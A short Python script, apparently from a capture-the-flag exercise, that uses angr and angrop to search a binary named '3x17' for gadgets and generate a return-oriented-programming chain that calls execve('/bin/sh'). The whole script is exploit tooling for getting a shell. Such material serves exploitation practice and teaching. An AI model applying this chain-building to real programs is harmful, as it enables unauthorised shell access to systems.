import angr, angrop

p = angr.Project("./3x17")
rop = p.analyses.ROP()
rop.find_gadgets()
chain = rop.execve(b"/bin/sh", None)
chain.print_payload_code()
